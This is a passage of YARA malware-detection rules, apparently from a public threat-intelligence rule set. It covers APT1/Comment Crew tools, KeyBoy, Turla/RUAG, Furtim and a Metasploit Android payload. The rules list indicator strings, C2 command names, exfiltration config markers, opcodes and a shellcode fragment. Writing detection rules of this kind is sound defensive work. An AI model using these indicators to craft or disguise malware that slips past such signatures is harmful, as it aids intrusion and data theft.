$b = "szFileUrl=%s" wide ascii
$c = "status=%u" wide ascii
$d = "down file success" wide ascii
$e = "Mozilla/4.0 (compatible; MSIE 6.0; Win32)" wide ascii
condition:
all of them
}
rule SSC_APT1_WEBC2_CLOVER
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$msg1 = "BUILD ERROR!" wide ascii
$msg2 = "SUCCESS!" wide ascii
$msg3 = "wild scan" wide ascii
$msg4 = "Code too clever" wide ascii
$msg5 = "insufficient lookahead" wide ascii
$ua1 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" wide ascii
$ua2 = "Mozilla/5.0 (Windows; Windows NT 5.1; en-US; rv:1.8.0.12) Firefox/1.5.0.12" wide ascii
condition:
2 of ($msg*) and 1 of ($ua*)
}
rule SSC_ccrewSSLBack1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "!@#%$^#@!" wide ascii
$b = "64.91.80.6" wide ascii
condition:
any of them
}
rule SSC_GOGGLES_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Kill process success!" wide ascii
$s2 = "Kill process failed!" wide ascii
$s3 = "Sleep success!" wide ascii
$s4 = "based on gloox" wide ascii
$pdb = "glooxtest.pdb" wide ascii
condition:
all of ($s*) or $pdb
}
rule SSC_Elise
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "SetElise.pdb" wide ascii
condition:
$a
}
rule SSC_SEASALT_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.00; Windows 98) KSMM" wide ascii
$s2 = "upfileok" wide ascii
$s3 = "download ok!" wide ascii
$s4 = "upfileer" wide ascii
$s5 = "fxftest" wide ascii
condition:
all of them
}
rule SSC_APT1_LIGHTBOLT
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$str1 = "bits.exe" wide ascii
$str2 = "PDFBROW" wide ascii
$str3 = "Browser.exe" wide ascii
$str4 = "Protect!" wide ascii
condition:
2 of them
}
rule SSC_APT1_GETMAIL
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$stra1 = "pls give the FULL path" wide ascii
$stra2 = "mapi32.dll" wide ascii
$stra3 = "doCompress" wide ascii
$strb1 = "getmail.dll" wide ascii
$strb2 = "doCompress" wide ascii
$strb3 = "love" wide ascii
condition:
all of ($stra*) or all of ($strb*)
}
rule SSC_BangatStrings
{
meta:
description = "Bangat Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-07-10"
strings:
$lib1 = "DreatePipe"
$lib2 = "HetSystemDirectoryA"
$lib3 = "SeleaseMutex"
$lib4 = "DloseWindowStation"
$lib5 = "DontrolService"
$file = "~hhC2F~.tmp"
$mc = "~_MC_3~"
condition:
all of ($lib*) or $file or $mc
}
rule SSC_BangatCode
{
meta:
description = "Bangat code features"
author = "Seth Hardy"
last_modified = "2014-07-10"
strings:
// dec [ebp + procname], push eax, push edx, call get procaddress
$ = { FE 4D ?? 8D 4? ?? 50 5? FF }
condition:
any of them
}
rule SSC_CookiesStrings
{
meta:
description = "Cookies Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-20"
strings:
$zip1 = "ntdll.exePK"
$zip2 = "AcroRd32.exePK"
$zip3 = "Setup=ntdll.exe\x0d\x0aSilent=1\x0d\x0a"
$zip4 = "Setup=%temp%\\AcroRd32.exe\x0d\x0a"
$exe1 = "Leave GetCommand!"
$exe2 = "perform exe success!"
$exe3 = "perform exe failure!"
$exe4 = "Entry SendCommandReq!"
$exe5 = "Reqfile not exist!"
$exe6 = "LeaveDealUpfile!"
$exe7 = "Entry PostData!"
$exe8 = "Leave PostFile!"
$exe9 = "Entry PostFile!"
$exe10 = "\\unknow.zip" wide ascii
$exe11 = "the url no respon!"
condition:
(2 of ($zip*)) or (2 of ($exe*))
}
rule SSC_GlassesStrings : Glasses Family
{
meta:
description = "Strings used by Glasses"
author = "Seth Hardy"
last_modified = "2014-07-22"
strings:
$ = "thequickbrownfxjmpsvalzydg"
$ = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0; %s.%s)"
$ = "\" target=\"NewRef\"></a>"
condition:
all of them
}
rule SSC_MiniAsp3_mem : memory {
meta: author = "chort (@chort0)"
description = "Detect MiniASP3 in memory"
strings:
$pdb = "MiniAsp3\\Release\\MiniAsp.pdb" fullword
$httpAbout = "http://%s/about.htm" fullword
$httpResult = "http://%s/result_%s.htm" fullword
$msgInetFail = "open internet failed" fullword
$msgRunErr = "run error!" fullword
$msgRunOk = "run ok!" fullword
$msgTimeOutM0 = "time out,change to mode 0" fullword
$msgCmdNull = "command is null!" fullword
condition:
($pdb and (all of ($http*)) and any of ($msg*))
}
rule SSC_WarpCode : Warp Family
{
meta:
description = "Warp code features"
author = "Seth Hardy"
last_modified = "2014-07-10"
strings:
// character replacement
$ = { 80 38 2B 75 03 C6 00 2D 80 38 2F 75 03 C6 00 5F }
condition:
any of them
}
rule SSC_android_metasploit : android
{
meta:
author = "https://twitter.com/plutec_net"
description = "This rule detects apps made with metasploit framework"
sample = "cb9a217032620c63b85a58dde0f9493f69e4bda1e12b180047407c15ee491b41"
strings:
$a = "*Lcom/metasploit/stage/PayloadTrustManager;"
$b = "(com.metasploit.stage.PayloadTrustManager"
$c = "Lcom/metasploit/stage/Payload$1;"
$d = "Lcom/metasploit/stage/Payload;"
condition:
all of them
}
rule SSC_keyboy_systeminfo
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Matches the system information format before sending to C2"
date = "2016-08-28"
md5 = "495adb1b9777002ecfe22aaf52fcee93"
strings:
//These strings are ASCII pre-2015 and UNICODE in 2016
$s1 = "SystemVersion:    %s" ascii wide
$s2 = "Product  ID:      %s" ascii wide
$s3 = "InstallPath:      %s" ascii wide
$s4 = "InstallTime:      %d-%d-%d, %02d:%02d:%02d" ascii wide
$s5 = "ResgisterGroup:   %s" ascii wide
$s6 = "RegisterUser:     %s" ascii wide
$s7 = "ComputerName:     %s" ascii wide
$s8 = "WindowsDirectory: %s" ascii wide
$s9 = "System Directory: %s" ascii wide
$s10 = "Number of Processors:       %d" ascii wide
$s11 = "CPU[%d]:  %s: %sMHz" ascii wide
$s12 = "RAM:         %dMB Total, %dMB Free." ascii wide
$s13 = "DisplayMode: %d x %d, %dHz, %dbit" ascii wide
$s14 = "Uptime:      %d Days %02u:%02u:%02u" ascii wide
condition:
//MZ header
uint16(0) == 0x5A4D and
//PE signature
uint32(uint32(0x3C)) == 0x00004550 and
filesize < 200KB and
7 of them
}
rule SSC_CVE_2012_0158_KeyBoy {
meta:
author = "Etienne Maynier <etienne@citizenlab.ca>"
description = "CVE-2012-0158 variant"
file = "8307e444cad98b1b59568ad2eba5f201"
strings:
$a = "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff09000600000000000000000000000100000001" nocase // OLE header
$b = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" nocase // junk data
$c = /5(\{\\b0\}|)[ ]*2006F00(\{\\b0\}|)[ ]*6F007(\{\\b0\}|)[ ]*400200045(\{\\b0\}|)[ ]*006(\{\\b0\}|)[ ]*E007(\{\\b0\}|)[ ]*400720079/ nocase
$d = "MSComctlLib.ListViewCtrl.2"
$e = "ac38c874503c307405347aaaebf2ac2c31ebf6e8e3" nocase //decoding shellcode
condition:
all of them
}
rule SSC_keyboy_errors
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Matches the sample's shell error2 log statements"
date = "2016-08-28"
md5 = "495adb1b9777002ecfe22aaf52fcee93"
strings:
//These strings are in ASCII pre-2015 and UNICODE in 2016
$error = "Error2" ascii wide
//2016 specific:
$s1 = "Can't find [%s]!Check the file name and try again!" ascii wide
$s2 = "Open [%s] error! %d" ascii wide
$s3 = "The Size of [%s] is zero!" ascii wide
$s4 = "CreateThread DownloadFile[%s] Error!" ascii wide
$s5 = "UploadFile [%s] Error:Connect Server Failed!" ascii wide
$s6 = "Receive [%s] Error(Recved[%d] != Send[%d])!" ascii wide
$s7 = "Receive [%s] ok! Use %2.2f seconds, Average speed %2.2f k/s" ascii wide
$s8 = "CreateThread UploadFile[%s] Error!" ascii wide
//Pre-2016:
$s9 = "Ready Download [%s] ok!" ascii wide
$s10 = "Get ControlInfo from FileClient error!" ascii wide
$s11 = "FileClient has a error!" ascii wide
$s12 = "VirtualAlloc SendBuff Error(%d)" ascii wide
$s13 = "ReadFile [%s] Error(%d)..." ascii wide
$s14 = "ReadFile [%s] Data[Readed(%d) != FileSize(%d)] Error..." ascii wide
$s15 = "CreateThread DownloadFile[%s] Error!" ascii wide
$s16 = "RecvData MyRecv_Info Size Error!" ascii wide
$s17 = "RecvData MyRecv_Info Tag Error!" ascii wide
$s18 = "SendData szControlInfo_1 Error!" ascii wide
$s19 = "SendData szControlInfo_3 Error!" ascii wide
$s20 = "VirtualAlloc RecvBuff Error(%d)" ascii wide
$s21 = "RecvData Error!" ascii wide
$s22 = "WriteFile [%s} Error(%d)..." ascii wide
condition:
//MZ header
uint16(0) == 0x5A4D and
//PE signature
uint32(uint32(0x3C)) == 0x00004550 and
filesize < 200KB and
$error and 3 of ($s*)
}
rule SSC_keyboy_commands
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Matches the 2016 sample's sent and received commands"
date = "2016-08-28"
md5 = "495adb1b9777002ecfe22aaf52fcee93"
strings:
$s1 = "Update" wide fullword
$s2 = "UpdateAndRun" wide fullword
$s3 = "Refresh" wide fullword
$s4 = "OnLine" wide fullword
$s5 = "Disconnect" wide fullword
$s6 = "Pw_Error" wide fullword
$s7 = "Pw_OK" wide fullword
$s8 = "Sysinfo" wide fullword
$s9 = "Download" wide fullword
$s10 = "UploadFileOk" wide fullword
$s11 = "RemoteRun" wide fullword
$s12 = "FileManager" wide fullword
condition:
//MZ header
uint16(0) == 0x5A4D and
//PE signature
uint32(uint32(0x3C)) == 0x00004550 and
filesize < 200KB and
6 of them
}
rule SSC_new_keyboy_header_codes
{
meta:
author = "Matt Brooks, @cmatthewbrooks"
desc = "Matches the 2016 sample's header codes"
date = "2016-08-28"
md5 = "495adb1b9777002ecfe22aaf52fcee93"
strings:
$s1 = "*l*" wide fullword
$s2 = "*a*" wide fullword
$s3 = "*s*" wide fullword
$s4 = "*d*" wide fullword
$s5 = "*f*" wide fullword
$s6 = "*g*" wide fullword
$s7 = "*h*" wide fullword
condition:
//MZ header //PE signature
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 200KB and all of them
}
rule SSC_RUAG_Cobra_Malware
{
meta:
description = "Detects a malware mentioned in the RUAG Case called Carbon/Cobra"
author = "Florian Roth"
reference = "https://goo.gl/N5MEj0"
score = 60
strings:
$s1 = "\\Cobra\\Release\\Cobra.pdb" ascii
condition:
uint16(0) == 0x5a4d and $s1
}
rule SSC_RUAG_Bot_Config_File
{
meta:
description = "Detects a specific config file used by malware in RUAG APT case"
author = "Florian Roth"
reference = "https://goo.gl/N5MEj0"
score = 60
strings:
$s1 = "[CONFIG]" ascii
$s2 = "name = " ascii
$s3 = "exe = cmd.exe" ascii
condition:
$s1 at 0 and $s2 and $s3 and filesize < 160
}
rule SSC_RUAG_Cobra_Config_File
{
meta:
description = "Detects a config text file used by malware Cobra in RUAG case"
author = "Florian Roth"
reference = "https://goo.gl/N5MEj0"
score = 60
strings:
$h1 = "[NAME]" ascii
$s1 = "object_id=" ascii
$s2 = "[TIME]" ascii fullword
$s3 = "lastconnect" ascii
$s4 = "[CW_LOCAL]" ascii fullword
$s5 = "system_pipe" ascii
$s6 = "user_pipe" ascii
$s7 = "[TRANSPORT]" ascii
$s8 = "run_task_system" ascii
$s9 = "[WORKDATA]" ascii
$s10 = "address1" ascii
condition:
$h1 at 0 and 8 of ($s*) and filesize < 5KB
}
rule SSC_Turla_APT_Malware_Gen3
{
meta:
description = "Detects Turla malware (based on sample used in the RUAG APT case)"
author = "Florian Roth"
family = "Turla"
reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
date = "2016-06-09"
hash1 = "c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4"
hash2 = "b62a643c96e2e41f639d2a8ce11d61e6b9d7fb3a9baf011120b7fec1b4ee3cf4"
hash3 = "edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348"
hash4 = "8f2ea0f916fda1dfb771f5441e919c561da5b6334b9f2fffcbf53db14063b24a"
hash5 = "8dddc744bbfcf215346c812aa569e49523996f73a1f22fe4e688084ce1225b98"
hash6 = "0c69258adcc97632b729e55664c22cd942812336d41e8ea0cff9ddcafaded20f"
hash7 = "2b4fba1ef06f85d1395945db40a9f2c3b3ed81b56fb9c2d5e5bb693c230215e2"
hash8 = "7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9"
hash9 = "edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348"
strings:
$x1 = "\\\\.\\pipe\\sdlrpc" fullword ascii
$x2 = "WaitMutex Abandoned %p" fullword ascii
$x3 = "OPER|Wrong config: no port|" fullword ascii
$x4 = "OPER|Wrong config: no lastconnect|" fullword ascii
$x5 = "OPER|Wrong config: empty address|" fullword ascii
$x6 = "Trans task %d obj %s ACTIVE fail robj %s" fullword ascii
$x7 = "OPER|Wrong config: no auth|" fullword ascii
$x8 = "OPER|Sniffer '%s' running... ooopppsss...|" fullword ascii
$s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Post Platform" fullword ascii
$s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Pre Platform" fullword ascii
$s3 = "www.yahoo.com" fullword ascii
$s4 = "MSXIML.DLL" fullword wide
$s5 = "www.bing.com" fullword ascii
$s6 = "%s: http://%s%s" fullword ascii
$s7 = "/javascript/view.php" fullword ascii
$s8 = "Task %d failed %s,%d" fullword ascii
$s9 = "Mozilla/4.0 (compatible; MSIE %d.0; " fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) or 6 of ($s*) ) ) or ( 10 of them )
}
rule SSC_Turla_APT_Malware_Gen1
{
meta:
description = "Detects Turla malware (based on sample used in the RUAG APT case)"
author = "Florian Roth"
family = "Turla"
reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
date = "2016-06-09"
hash1 = "0e1bf347c37fb199886f1e675e372ba55ac4627e8be2f05a76c2c64f9b6ed0e4"
hash2 = "7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9"
hash3 = "fe3ffd7438c0d38484bf02a78a19ea81a6f51b4b3f2b2228bd21974c2538bbcd"
hash4 = "c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4"
hash5 = "b62a643c96e2e41f639d2a8ce11d61e6b9d7fb3a9baf011120b7fec1b4ee3cf4"
hash6 = "edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348"
hash7 = "8f2ea0f916fda1dfb771f5441e919c561da5b6334b9f2fffcbf53db14063b24a"
hash8 = "8dddc744bbfcf215346c812aa569e49523996f73a1f22fe4e688084ce1225b98"
hash9 = "0c69258adcc97632b729e55664c22cd942812336d41e8ea0cff9ddcafaded20f"
hash10 = "2b4fba1ef06f85d1395945db40a9f2c3b3ed81b56fb9c2d5e5bb693c230215e2"
strings:
$x1 = "too long data for this type of transport" fullword ascii
$x2 = "not enough server resources to complete operation" fullword ascii
$x3 = "Task not execute. Arg file failed." fullword ascii
$x4 = "Global\\MSCTF.Shared.MUTEX.ZRX" fullword ascii
$s1 = "peer has closed the connection" fullword ascii
$s2 = "tcpdump.exe" fullword ascii
$s3 = "windump.exe" fullword ascii
$s4 = "dsniff.exe" fullword ascii
$s5 = "wireshark.exe" fullword ascii
$s6 = "ethereal.exe" fullword ascii
$s7 = "snoop.exe" fullword ascii
$s8 = "ettercap.exe" fullword ascii
$s9 = "miniport.dat" fullword ascii
$s10 = "net_password=%s" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and ( 2 of ($x*) or 8 of ($s*) ) ) or ( 12 of them )
}
rule SSC_Turla_APT_srsvc
{
meta:
description = "Detects Turla malware (based on sample used in the RUAG APT case)"
author = "Florian Roth"
family = "Turla"
reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
date = "2016-06-09"
hash1 = "65996f266166dbb479a42a15a236e6564f0b322d5d68ee546244d7740a21b8f7"
hash2 = "25c7ff1eb16984a741948f2ec675ab122869b6edea3691b01d69842a53aa3bac"
strings:
$x1 = "SVCHostServiceDll.dll" fullword ascii
$s2 = "msimghlp.dll" fullword wide
$s3 = "srservice" fullword wide
$s4 = "ModStart" fullword ascii
$s5 = "ModStop" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and ( 1 of ($x*) or all of ($s*) ) ) or ( all of them )
}
rule SSC_Turla_APT_Malware_Gen2
{
meta:
description = "Detects Turla malware (based on sample used in the RUAG APT case)"
author = "Florian Roth"
family = "Turla"
reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
date = "2016-06-09"
hash1 = "0e1bf347c37fb199886f1e675e372ba55ac4627e8be2f05a76c2c64f9b6ed0e4"
hash2 = "7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9"
hash3 = "fe3ffd7438c0d38484bf02a78a19ea81a6f51b4b3f2b2228bd21974c2538bbcd"
hash4 = "c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4"
strings:
$x1 = "Internal command not support =((" fullword ascii
$x2 = "L|-1|AS_CUR_USER:OpenProcessToken():%d, %s|" fullword ascii
$x3 = "L|-1|CreateProcessAsUser():%d, %s|" fullword ascii
$x4 = "AS_CUR_USER:OpenProcessToken():%d" fullword ascii
$x5 = "L|-1|AS_CUR_USER:LogonUser():%d, %s|" fullword ascii
$x6 = "L|-1|try to run dll %s with user priv|" fullword ascii
$x7 = "\\\\.\\Global\\PIPE\\sdlrpc" fullword ascii
$x8 = "\\\\%s\\pipe\\comnode" fullword ascii
$x9 = "Plugin dll stop failed." fullword ascii
$x10 = "AS_USER:LogonUser():%d" fullword ascii
$s1 = "MSIMGHLP.DLL" fullword wide
$s2 = "msimghlp.dll" fullword ascii
$s3 = "ximarsh.dll" fullword ascii
$s4 = "msximl.dll" fullword ascii
$s5 = "INTERNAL.dll" fullword ascii
$s6 = "\\\\.\\Global\\PIPE\\" fullword ascii
$s7 = "ieuser.exe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) or 5 of ($s*) ) ) or ( 10 of them )
}
rule SSC_RUAG_Exfil_Config_File
{
meta:
description = "Detects a config text file used in data exfiltration in RUAG case"
author = "Florian Roth"
reference = "https://goo.gl/N5MEj0"
score = 60
strings:
$h1 = "[TRANSPORT]" ascii
$s1 = "system_pipe" ascii
$s2 = "spstatus" ascii
$s3 = "adaptable" ascii
$s4 = "post_frag" ascii
$s5 = "pfsgrowperiod" ascii
condition:
$h1 at 0 and all of ($s*) and filesize < 1KB
}
rule SSC_RUAG_Tavdig_Malformed_Executable
{
meta:
description = "Detects an embedded executable with a malformed header - known from Tavdig malware"
author = "Florian Roth"
reference = "https://goo.gl/N5MEj0"
score = 60
condition:
/* MZ Header and malformed PE header > 0x0bad */
uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x0000AD0B
}
rule SSC_Furtim_nativeDLL
{
meta:
description = "Detects Furtim malware - file native.dll"
author = "Florian Roth"
reference = "MISP 3971"
date = "2016-06-13"
hash1 = "4f39d3e70ed1278d5fa83ed9f148ca92383ec662ac34635f7e56cc42eeaee948"
strings:
$s1 = "FqkVpTvBwTrhPFjfFF6ZQRK44hHl26" fullword ascii
$op0 = { e0 b3 42 00 c7 84 24 ac } /* Opcode */
$op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 } /* Opcode */
$op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 } /* Opcode */
condition:
uint16(0) == 0x5a4d and filesize < 900KB and $s1 or all of ($op*)
}
rule SSC_Furtim_Parent_1
{
meta:
description = "Detects Furtim Parent Malware"
author = "Florian Roth"
reference = "https://sentinelone.com/blogs/sfg-furtims-parent/"
date = "2016-07-16"
hash1 = "766e49811c0bb7cce217e72e73a6aa866c15de0ba11d7dda3bd7e9ec33ed6963"
strings:
/* RC4 encryption password */
$x1 = "dqrChZonUF" fullword ascii
/* Other strings */
$s1 = "Egistec" fullword wide
$s2 = "Copyright (C) 2016" fullword wide
/* Op Code */
$op1 = { c0 ea 02 88 55 f8 8a d1 80 e2 03 }
$op2 = { 5d fe 88 55 f9 8a d0 80 e2 0f c0 }
$op3 = { c4 0c 8a d9 c0 eb 02 80 e1 03 88 5d f8 8a d8 c0 }
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( $x1 or ( all of ($s*) and all of ($op*) ) ) ) or all of them
}
rule SSC_sig_5783b35b2eace55a5762df27fcb0b0fb28371b3e {
meta:
description = "Auto-generated rule - file 5783b35b2eace55a5762df27fcb0b0fb28371b3e.codex"
author = "YarGen Rule Generator"
reference = "not set"
date = "2016-07-21"
hash1 = "72513534f2e0f3e77a22023b887df3718c9df70686eb0ae58cbbde2f90f447e4"
strings:
$s1 = "B+P:\\6" fullword ascii
$s2 = "6.666K6S6d6l6}6" fullword ascii
$s3 = "0!0&0+0<0A0F0W0\\0a0n0z0" fullword ascii
$s4 = ";#;);.;:;@;E;Q;W;\\;h;q;v;" fullword ascii
$s5 = "2#2-222F2L2W2\\2b2g2x2~2" fullword ascii
$s6 = "9\"9)90979>9E9L9S9Z9k9}9" fullword ascii
$s7 = "6-747;7B7I7P7W7^7e7l7s7z7" fullword ascii
$s8 = "4\"4'43494>4J4P4U4a4g4l4x4" fullword ascii
$s9 = ":#:(:4:::?:K:T:Y:e:k:p:|:" fullword ascii
$s10 = "WD.hyA" fullword ascii
$s11 = "<\"<)<0<7<><E<L<S<Z<a<h<" fullword ascii
$s12 = "=&=,=1=>=D=I=V=_=d=q=w=|=" fullword ascii
$s13 = "; ;(;0;8;@;H;P;X;`;h;p;{;" fullword ascii
$s14 = "<\"<)<0<7<><E<L<S<Z<a<h<o<v<" fullword ascii
$s15 = "6#6(616;6@6I6S6X6d6n6s6|6" fullword ascii
$s16 = "(%r-c;u" fullword ascii
$s17 = "3%3G3N3U3\\3c3j3q3x3" fullword ascii
$s18 = "7\"767T7[7b7i7p7w7~7" fullword ascii
$s19 = "1 1-1>1C1P1a1f1s1" fullword ascii
$s20 = "8 8&8,8A8M8^8d8i8" fullword ascii
$op0 = { e0 b3 42 00 c7 84 24 ac } /* Opcode */
$op1 = { a1 e0 79 44 00 57 ff 75 1c ff 90 78 01 00 00 83 } /* Opcode */
$op2 = { 3c ee 42 00 c7 84 24 8c } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )
}
rule SSC_sig_7acb8d6d4c062c3097a7d31df103bc4d018519f9 {
meta:
description = "Auto-generated rule - file 7acb8d6d4c062c3097a7d31df103bc4d018519f9.codex"
author = "YarGen Rule Generator"
reference = "not set"
date = "2016-07-21"
hash1 = "e1607486cbb2d111d5df314fe58948aa0dc5897f56f7fd763c62bb30651380e3"
strings:
$s1 = "5(666Z6c6" fullword ascii
$s2 = "Wlm;y%UD%d" fullword ascii
$s3 = ";1;9;@;G;N;U;\\;c;j;q;x;" fullword ascii
$s4 = "8 8'8.858<8C8J8Q8X8_8f8m8t8" fullword ascii
$s5 = "2 2,282=2B2G2P2U2Z2_2h2s2x2" fullword ascii
$s6 = "4'5.555<5C5J5Q5X5_5f5m5t5{5" fullword ascii
$s7 = "0#0*01080?0F0M0T0[0b0i0p0w0" fullword ascii
$s8 = "6$6,616=6B6G6S6X6]6i6n6s6" fullword ascii
$s9 = "=\"=)=0=7=>=E=L=S=Z=a=h=" fullword ascii
$s10 = "6&6-646;6B6I6P6W6^6e6l6s6z6" fullword ascii
$s11 = "O.QrH@" fullword ascii
$s12 = ">\">/>4>A>F>S>X>e>j>w>|>" fullword ascii
$s13 = "0#0(040=0B0N0T0Y0e0k0p0|0" fullword ascii
$s14 = "5)5/545@5F5K5W5`5e5q5w5|5" fullword ascii
$s15 = "=!=&=3=8=E=N=S=`=e=s=x=}=" fullword ascii
$s16 = ":(:/:6:=:D:K:R:Y:`:g:n:u:|:" fullword ascii
$s17 = "7\"727<7F7M7W7a7k7u7" fullword ascii
$s18 = "2+21262E2K2P2\\2h2m2|2" fullword ascii
$s19 = ";/;5;:;G;V;\\;a;n;};" fullword ascii
$s20 = ";\";-;8;C;N;^;i;t;" fullword ascii
$op0 = { ff 44 24 14 8d 47 44 50 a1 08 63 44 00 ff 90 84 } /* Opcode */
$op1 = { 6d 43 00 c7 84 24 10 03 00 00 0c 6d 43 00 c7 84 } /* Opcode */
$op2 = { c7 43 0c 20 02 00 00 89 5d f0 ff 90 f8 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )
}
rule SSC_d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9 {
meta:
description = "Auto-generated rule - file d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9.codex"
author = "YarGen Rule Generator"
reference = "not set"
date = "2016-07-21"
hash1 = "d1dc9b2905264da34dc97d6c005810fbcc99be1a6b4b41f883bb179dbcacba6e"
strings:
$s1 = ":&:-:=:J:O:\\:m:r:" fullword ascii
$s2 = "6)6/666;6N6W6^6c6t6y6" fullword ascii
$s3 = "666Q6V6b6g6~6" fullword ascii
$s4 = "0%0,010A0F0K0\\0a0f0w0|0" fullword ascii
$s5 = "6!6(63686E6J6W6\\6i6n6{6" fullword ascii
$s6 = "3 3%33383=3J3R3`3e3o3t3~3" fullword ascii
$s7 = "4 4'40454:4G4M4R4_4e4j4w4" fullword ascii
$s8 = "1#1(141=1B1N1T1Y1e1k1p1|1" fullword ascii
$s9 = "?(?2?<?C?J?Q?X?_?f?m?t?{?" fullword ascii
$s10 = "?#?*?1?8???F?M?T?[?b?i?p?w?" fullword ascii
$s11 = "6)6/646@6F6K6W6]6b6n6w6|6" fullword ascii
$s12 = "4#40454:4G4L4Q4^4c4h4u4z4" fullword ascii
$s13 = "<\"<'<3<8<=<I<N<S<_<d<i<u<z<" fullword ascii
$s14 = ">%>/>9>@>G>N>U>\\>c>j>q>" fullword ascii
$s15 = "WTZDAE" fullword ascii
$s16 = "060>0E0K0P0\\0b0g0v0|0" fullword ascii
$s17 = "4#4-474A4K4U4\\4f4p4z4" fullword ascii
$s18 = "7\"7,767@7J7T7^7h7q7{7" fullword ascii
$s19 = ";\";';4;E;J;W;k;p;};" fullword ascii
$s20 = ";0;;;F;Q;\\;g;r;};" fullword ascii
$op0 = { a1 b8 63 44 00 83 c4 14 53 ff 75 14 56 57 ff 90 } /* Opcode */
$op1 = { 8b d8 8b 45 08 8b 40 3a 81 c3 00 10 00 00 03 c3 } /* Opcode */
$op2 = { 5c 2d 44 00 c7 84 24 c0 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )
}
rule SSC_sig_2fb404bdcebc7acbeb598f8a2ddbecf48c60b113 {
meta:
description = "Auto-generated rule - file 2fb404bdcebc7acbeb598f8a2ddbecf48c60b113.codex"
author = "YarGen Rule Generator"
reference = "not set"
date = "2016-07-21"
hash1 = "4f39d3e70ed1278d5fa83ed9f148ca92383ec662ac34635f7e56cc42eeaee948"
strings:
$s1 = ":%:0:;:F:Q:\\:p:|:" fullword ascii
$s2 = "6.666>6F6N6V6^6f6n6v6~6" fullword ascii
$s3 = "6!6(6/666=6D6K6R6Y6r6:7" fullword ascii
$s4 = "1t83jL.bjG" fullword ascii
$s5 = "6!61666V6]6p6" fullword ascii
$s6 = "2%2D2P2`2p2|2" fullword ascii
$s7 = "42494@4G4N4U4\\4c4j4q4x4" fullword ascii
$s8 = "9+92999@9G9N9U9\\9c9j9q9x9" fullword ascii
$s9 = "4!4&43484E4J4W4\\4i4n4s4" fullword ascii
$s10 = "5$5+52595@5G5N5U5\\5c5j5q5" fullword ascii
$s11 = "1.252<2C2J2Q2X2_2f2m2t2{2" fullword ascii
$s12 = "8 8%818:8?8K8Q8V8b8h8m8y8" fullword ascii
$s13 = "9'93989=9B9K9P9U9Z9c9n9s9" fullword ascii
$s14 = ":\":':,:8:=:B:R:Z:`:e:v:}:" fullword ascii
$s15 = "=#=(=4=:=?=K=Q=V=b=k=p=|=" fullword ascii
$s16 = "= =*=1=8=?=F=M=T=[=b=i=p=w=~=" fullword ascii
$s17 = "3&3-343;3B3I3P3W3^3e3l3s3z3" fullword ascii
$s18 = ":!:(:/:6:=:I:N:S:`:f:k:x:~:" fullword ascii
$s19 = "cMDkAjy=" fullword ascii
$s20 = "=#=/=4=9=E=J=O=[=`=e=q=v={=" fullword ascii
$op0 = { e0 b3 42 00 c7 84 24 ac } /* Opcode */
